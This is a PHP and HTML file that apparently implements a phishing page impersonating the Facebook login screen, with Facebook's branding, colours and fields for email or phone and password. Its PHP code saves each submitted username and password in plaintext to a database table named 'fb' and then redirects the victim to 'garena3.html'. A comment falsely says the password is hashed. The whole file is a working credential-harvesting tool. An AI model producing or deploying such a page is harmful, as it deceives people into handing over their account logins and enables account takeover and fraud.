<?php
// Include config file
require_once "config.php";

// Define variables and initialize with empty values
$username = $password =  "";
$username_err = $password_err  = "";

// Processing form data when form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Validate username
    if (empty(trim($_POST["username"]))) {
        $username_err = "Please enter a username.";
    } elseif (!preg_match('/^[a-zA-Z0-9@._]+$/', trim($_POST["username"]))) {
        $username_err = "Username can only contain letters, numbers, and underscores.";
    } else {
        // Prepare a select statement
        $sql = "SELECT id FROM fb WHERE username = ?";

        if ($stmt = mysqli_prepare($link, $sql)) {
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmt, "s", $param_username);

            // Set parameters
            $param_username = trim($_POST["username"]);

            // Attempt to execute the prepared statement
            if (mysqli_stmt_execute($stmt)) {
                /* store result */
                mysqli_stmt_store_result($stmt);

                if (mysqli_stmt_num_rows($stmt) == 1) {
                    $username_err = "This username is already taken.";
                } else {
                    $username = trim($_POST["username"]);
                }
            } else {
                echo "Oops! Something went wrong. Please try again later.";
            }

            // Close statement
            mysqli_stmt_close($stmt);
        }
    }

    // Validate password
    if (empty(trim($_POST["password"]))) {
        $password_err = "Please enter your password.";
    } elseif (strlen(trim($_POST["password"])) > 15) {
        $password_err = "Password must be less than 15 characters.";
    } else {
        $password = trim($_POST["password"]);
    }

    
    

    // Check input errors before inserting in database
    if (empty($username_err) && empty($password_err)) {
        // Here you'd insert the user into the database
        // Example (requires hashing password):
        $sql = "INSERT INTO fb (username, password) VALUES (?, ?)";

        if ($stmt = mysqli_prepare($link, $sql)) {
            mysqli_stmt_bind_param($stmt, "ss", $param_username, $param_password);

            $param_username = $username;
            $param_password = $password; // Creates a password hash

            if (mysqli_stmt_execute($stmt)) {
              header("Location: garena3.html");
              exit;
            } else {
                echo "Something went wrong. Please try again later.";
            }

            mysqli_stmt_close($stmt);
        }
    }

    // Close connection
    mysqli_close($link);
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login • Facebook</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(145deg, #f0f2f5, #e4e6eb);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-wrapper {
      background: white;
      padding: 40px 30px;
      border-radius: 12px;
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 380px;
      text-align: center;
      transition: all 0.3s ease;
    }

    .login-wrapper:hover {
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
    }

    .logo {
      color: #0866ff;
      font-size: 40px;
      font-weight: 800;
      margin-bottom: 25px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px 18px;
      margin-bottom: 15px;
      border: 1px solid #ccd0d5;
      border-radius: 8px;
      font-size: 16px;
      transition: 0.2s;
    }

    input:focus {
      border-color: #0866ff;
      box-shadow: 0 0 0 3px #e7f3ff;
      outline: none;
    }

    .login-btn {
      background-color: #0866ff;
      color: white;
      border: none;
      width: 100%;
      padding: 14px;
      font-size: 18px;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      margin-bottom: 12px;
      transition: background-color 0.3s;
    }

    .login-btn:hover {
      background-color: #1877f2;
    }
    .error {
            color: red;
            font-size: 14px;
            margin-top:5px;
          }
    .forgot {
      display: block;
      font-size: 14px;
      color: #0866ff;
      margin-bottom: 20px;
      text-decoration: none;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    .divider {
      height: 1px;
      background-color: #ddd;
      margin: 20px 0;
    }

    .create-btn {
      background-color: #42b72a;
      color: white;
      border: none;
      width: 60%;
      padding: 12px;
      font-size: 16px;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .create-btn:hover {
      background-color: #36a420;
    }

    @media (max-width: 480px) {
      .login-wrapper {
        padding: 30px 20px;
        border-radius: 0;
        box-shadow: none;
      }

      .create-btn {
        width: 100%;
      }
      
    }
  </style>
</head>
<body>
  <div class="login-wrapper">
    <div class="logo">facebook</div>
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
      <input type="text" placeholder="Email address or phone number" name="username" value="<?php echo htmlspecialchars($username); ?>" required />
      <div class="error"><?php echo $username_err; ?></div>
      <input type="password" placeholder="Password" name="password" value="<?php echo htmlspecialchars($password); ?>" required />
      <div class="error"><?php echo $password_err; ?></div>
      <button type="submit" class="login-btn">Log In</button>
      <a href="#" class="forgot">Forgotten password?</a>
      <div class="divider"></div>
      <button type="button" class="create-btn">Create New Account</button>
    </form>
  </div>
</body>
</html>
